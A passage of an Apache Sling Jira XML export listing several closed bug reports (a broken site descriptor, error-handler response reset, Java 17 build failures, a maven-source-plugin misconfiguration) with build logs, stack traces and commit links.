                            <comment id="17745414" author="cziegeler" created="Fri, 21 Jul 2023 05:18:03 +0000"  >&lt;p&gt;Add configuration switch &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/8cf6369ee41c28a98c9c9a019d31f35da51fb217&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/8cf6369ee41c28a98c9c9a019d31f35da51fb217&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13532313">SLING-11825</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 13 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1j9rk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11966] Broken site descriptor</title>
                <link>https://issues.apache.org/jira/browse/SLING-11966</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The XML in &lt;tt&gt;site.xml&lt;/tt&gt; became non-well-formed after commit &lt;a href=&quot;https://github.com/apache/sling-parent/commit/17d84016a7f28821b452eb927906c1e660e6e130&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-parent/commit/17d84016a7f28821b452eb927906c1e660e6e130&lt;/a&gt;. This leads to errors like this when building sites based on this descriptor&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-site-plugin:3.12.1:site (&lt;span class=&quot;code-keyword&quot;&gt;default&lt;/span&gt;-site) on project slingfeature-maven-plugin: SiteToolException: Error parsing site descriptor: start tag unexpected character &amp;lt; (position: START_DOCUMENT seen ...TION/1.8.0 http:&lt;span class=&quot;code-comment&quot;&gt;//maven.apache.org/xsd/decoration-1.8.0.xsd&quot;\n    &amp;lt;... @23:6) -&amp;gt; [Help 1]&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13543641">SLING-11966</key>
            <summary>Broken site descriptor</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Sat, 15 Jul 2023 08:36:59 +0000</created>
                <updated>Fri, 21 Jul 2023 12:47:20 +0000</updated>
                            <resolved>Sat, 15 Jul 2023 08:40:02 +0000</resolved>
                                    <version>Parent 50</version>
                                    <fixVersion>Parent 52</fixVersion>
                                    <component>General</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17743357" author="kwin" created="Sat, 15 Jul 2023 08:40:02 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-parent/commit/2c4cf8a3c14b8fbb14c37da37664b6d0274bdd91&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-parent/commit/2c4cf8a3c14b8fbb14c37da37664b6d0274bdd91&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 14 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1j5w8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11964] DefaultErrorHandler must not reset response</title>
                <link>https://issues.apache.org/jira/browse/SLING-11964</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The Sling Engine is ensuring that the response is already reset before the ErrorHandler is invoked. As there might be error filters running between that reset and the ErrorHandler, the ErrorHandler must not reset the response again. Otherwise it would wipe out whatever the filters had already done to the response&lt;/p&gt;</description>
                <environment></environment>
        <key id="13543423">SLING-11964</key>
            <summary>DefaultErrorHandler must not reset response</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Thu, 13 Jul 2023 12:32:14 +0000</created>
                <updated>Tue, 8 Aug 2023 06:24:29 +0000</updated>
                            <resolved>Thu, 13 Jul 2023 12:33:20 +0000</resolved>
                                    <version>Servlets Resolver 2.9.12</version>
                                    <fixVersion>Servlets Resolver 2.9.14</fixVersion>
                                    <component>Servlets</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17742789" author="cziegeler" created="Thu, 13 Jul 2023 12:33:20 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-servlets-resolver/commit/0f9151e3d30e3b6ead6056ad51c5121d8a49f80b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-servlets-resolver/commit/0f9151e3d30e3b6ead6056ad51c5121d8a49f80b&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17742790" author="cziegeler" created="Thu, 13 Jul 2023 12:33:59 +0000"  >&lt;p&gt;As the recent servlets resolver requires latest Sling API, this dependency ensures that a recent enough version of Sling Engine is used in combination with the resolver&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 14 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1j4js:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11946] Project Archetype build fails with Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11946</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;We are using outdated versions of the maven-bundle-plugin&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] [ERROR] Failed to execute goal org.apache.felix:maven-bundle-plugin:4.2.0:bundle (default-bundle) on project core: Internal error in maven-bundle-plugin: ConcurrentModificationException -&amp;gt; [Help 1]
[INFO] org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal org.apache.felix:maven-bundle-plugin:4.2.0:bundle (default-bundle) on project core: Internal error in maven-bundle-plugin&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13543192">SLING-11946</key>
            <summary>Project Archetype build fails with Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 11 Jul 2023 21:56:12 +0000</created>
                <updated>Mon, 17 Jul 2023 08:29:32 +0000</updated>
                            <resolved>Wed, 12 Jul 2023 14:54:14 +0000</resolved>
                                                    <fixVersion>Project Archetype 1.0.12</fixVersion>
                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 15 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1j34o:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11944] Misconfigured Maven Source Plugin breaks release build</title>
                <link>https://issues.apache.org/jira/browse/SLING-11944</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] [INFO] --- checkstyle:3.3.0:check (default) @ org.apache.sling.testing.paxexam ---
[INFO] [INFO] You have 0 Checkstyle violations.
[INFO] [INFO] 
[INFO] [INFO] &amp;lt;&amp;lt;&amp;lt; source:3.3.0:jar (attach-sources) &amp;lt; generate-sources @ org.apache.sling.testing.paxexam &amp;lt;&amp;lt;&amp;lt;
[INFO] [INFO] 
[INFO] [INFO] 
[INFO] [INFO] --- source:3.3.0:jar (attach-sources) @ org.apache.sling.testing.paxexam ---
[INFO] [INFO] Building jar: /[...]/org.apache.sling.testing.paxexam/target/checkout/target/org.apache.sling.testing.paxexam-4.0.0-sources.jar
[INFO] [INFO] 
[INFO] [INFO] --- source:3.3.0:jar-no-fork (attach-sources) @ org.apache.sling.testing.paxexam ---
[INFO] [ERROR] We have duplicated artifacts attached.
[INFO] [INFO] ------------------------------------------------------------------------
[INFO] [INFO] BUILD FAILURE
[INFO] [INFO] ------------------------------------------------------------------------
[INFO] [INFO] Total time:  18.823 s
[INFO] [INFO] Finished at: 2023-07-09T20:53:50+02:00
[INFO] [INFO] ------------------------------------------------------------------------
[INFO] [ERROR] Failed to execute goal org.apache.maven.plugins:maven-source-plugin:3.3.0:jar-no-fork (attach-sources) on project org.apache.sling.testing.paxexam: Presumably you have configured maven-source-plugn to execute twice times in your build. You have to configure a classifier for at least on of them. -&amp;gt; [Help 1]
[INFO] [ERROR] 
[INFO] [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[INFO] [ERROR] Re-run Maven using the -X switch to enable full debug logging.
[INFO] [ERROR] 
[INFO] [ERROR] For more information about the errors and possible solutions, please read the following articles:
[INFO] [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  22.082 s
[INFO] Finished at: 2023-07-09T20:53:50+02:00
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-release-plugin:3.0.1:perform (default-cli) on project org.apache.sling.testing.paxexam: Maven execution failed, exit code: 1 -&amp;gt; [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13542933">SLING-11944</key>
            <summary>Misconfigured Maven Source Plugin breaks release build</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="olli">Oliver Lietz</assignee>
                                    <reporter username="olli">Oliver Lietz</reporter>
                        <labels>
                    </labels>
                <created>Sun, 9 Jul 2023 19:54:10 +0000</created>
                <updated>Thu, 13 Jul 2023 00:36:36 +0000</updated>
                            <resolved>Sun, 9 Jul 2023 20:00:49 +0000</resolved>
                                    <version>Parent 50</version>
                                    <fixVersion>Parent 51</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17741423" author="olli" created="Sun, 9 Jul 2023 20:00:49 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-parent/commit/3063788795e6de55f41cdc8efe749b41b2dfe23b&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;3063788&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17741506" author="kwin" created="Mon, 10 Jul 2023 08:40:04 +0000"  >&lt;p&gt;FTR: The switch in ASF parent from &quot;jar&quot; to &quot;jar-no-fork&quot; was made 9 years ago: &lt;a href=&quot;https://github.com/apache/maven-apache-parent/commit/e813eb7f3c0b9e81a8190c3c647d7c5d47404a61&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/maven-apache-parent/commit/e813eb7f3c0b9e81a8190c3c647d7c5d47404a61&lt;/a&gt;. Although this meant some overhead in our release builds it never lead to a failure until m-source-p 3.3.0 due to &lt;a href=&quot;https://issues.apache.org/jira/browse/MSOURCES-121&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/MSOURCES-121&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13234166">MSOURCES-121</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 15 weeks, 3 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1j1jk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11936] Sling Feature Maven Plugin fails on Java 17: module java.base does not &quot;opens java.lang&quot; to unnamed module @74fa148d</title>
                <link>https://issues.apache.org/jira/browse/SLING-11936</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;We probably need to upgrade Mockito, as documented at &lt;a href=&quot;https://cwiki.apache.org/confluence/pages/viewpage.action?pageId=255071690#CommonIssueswhenbuildingwithnewerJDKs(11or17)-TestfailureswhentryingtoinstrumentclasseswithMockito&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://cwiki.apache.org/confluence/pages/viewpage.action?pageId=255071690#CommonIssueswhenbuildingwithnewerJDKs(11or17)-TestfailureswhentryingtoinstrumentclasseswithMockito&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] org.apache.sling.feature.maven.mojos.AnalyseFeaturesMojoTest.testTaskConfigurationSupplied  Time elapsed: 0.044 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
java.lang.ExceptionInInitializerError
	at org.mockito.cglib.core.KeyFactory$Generator.generateClass(KeyFactory.java:167)
	at org.mockito.cglib.core.DefaultGeneratorStrategy.generate(DefaultGeneratorStrategy.java:25)
	at org.mockito.cglib.core.AbstractClassGenerator.create(AbstractClassGenerator.java:217)
	at org.mockito.cglib.core.KeyFactory$Generator.create(KeyFactory.java:145)
	at org.mockito.cglib.core.KeyFactory.create(KeyFactory.java:117)
	at org.mockito.cglib.core.KeyFactory.create(KeyFactory.java:109)
	at org.mockito.cglib.core.KeyFactory.create(KeyFactory.java:105)
	at org.mockito.cglib.proxy.Enhancer.&amp;lt;clinit&amp;gt;(Enhancer.java:70)
	at org.mockito.internal.creation.cglib.ClassImposterizer.createProxyClass(ClassImposterizer.java:95)
	at org.mockito.internal.creation.cglib.ClassImposterizer.imposterise(ClassImposterizer.java:57)
	at org.mockito.internal.creation.cglib.ClassImposterizer.imposterise(ClassImposterizer.java:49)
	at org.mockito.internal.creation.cglib.CglibMockMaker.createMock(CglibMockMaker.java:24)
	at org.mockito.internal.util.MockUtil.createMock(MockUtil.java:33)
	at org.mockito.internal.MockitoCore.mock(MockitoCore.java:59)
	at org.mockito.Mockito.mock(Mockito.java:1285)
	at org.mockito.Mockito.mock(Mockito.java:1163)
	at org.apache.sling.feature.maven.mojos.AnalyseFeaturesMojoTest.testTaskConfigurationSupplied(AnalyseFeaturesMojoTest.java:57)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:568)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306)
	at org.junit.runners.BlockJUnit4ClassRunner$1.evaluate(BlockJUnit4ClassRunner.java:100)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:366)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:103)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:63)
	at org.junit.runners.ParentRunner$4.run(ParentRunner.java:331)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:79)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:329)
	at org.junit.runners.ParentRunner.access$100(ParentRunner.java:66)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:293)
	at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:413)
	at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:364)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:272)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:237)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:158)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:428)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:562)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:548)
Caused by: java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not &quot;opens java.lang&quot; to unnamed module @74fa148d
	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)
	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)
